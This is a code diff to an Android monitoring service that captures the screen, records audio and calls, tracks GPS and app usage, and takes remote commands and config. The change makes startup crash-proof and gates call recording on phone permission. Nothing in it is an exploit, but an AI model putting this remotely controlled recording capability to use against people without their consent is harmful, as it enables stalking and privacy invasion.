@@ -110,23 +110,37 @@ class MonitoringForegroundService : Service() {
         instance = this
         Log.i(TAG, "onCreate — API ${Build.VERSION.SDK_INT}")
 
-        acquireWakeLock()
-        createNotificationChannel()
-        startForegroundSafe()          // start immediately, no projection type yet
+        try {
+            acquireWakeLock()
+            createNotificationChannel()
+            startForegroundSafe()          // start immediately, no projection type yet
 
-        screenEngine   = ScreenCaptureEngine(this)
-        audioEngine    = AudioRecorderEngine(this)
-        gpsTracker     = GpsTracker(this)
-        usageTracker   = AppUsageTracker(this)
-        configManager  = RemoteConfigManager(this)
-        commandManager = RealtimeCommandManager(this, scope, gpsTracker) { mediaProjection }
+            screenEngine   = ScreenCaptureEngine(this)
+            audioEngine    = AudioRecorderEngine(this)
+            gpsTracker     = GpsTracker(this)
+            usageTracker   = AppUsageTracker(this)
+            configManager  = RemoteConfigManager(this)
+            commandManager = RealtimeCommandManager(this, scope, gpsTracker) { mediaProjection }
 
-        commandManager.startListening()
-        startRemoteConfigLoop()        // fetch settings every 5 min
-
-        // ── Start automatic call recorder ─────────────────────────────────────
-        CallMonitoringService.start(this)
-        Log.i(TAG, "CallMonitoringService started")
+            try { commandManager.startListening() } catch (e: Exception) {
+                Log.e(TAG, "commandManager.startListening failed: ${e.message}")
+            }
+            try { startRemoteConfigLoop() } catch (e: Exception) {
+                Log.e(TAG, "startRemoteConfigLoop failed: ${e.message}")
+            }
+            // Only start call recorder if READ_PHONE_STATE is granted
+            val hasPhonePermission = android.content.pm.PackageManager.PERMISSION_GRANTED ==
+                checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE)
+            if (hasPhonePermission) {
+                CallMonitoringService.start(this)
+                Log.i(TAG, "CallMonitoringService started")
+            } else {
+                Log.w(TAG, "READ_PHONE_STATE not granted — call recording deferred")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "onCreate FATAL error: ${e.message}", e)
+            // Don't crash the service — it will keep running in foreground
+        }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
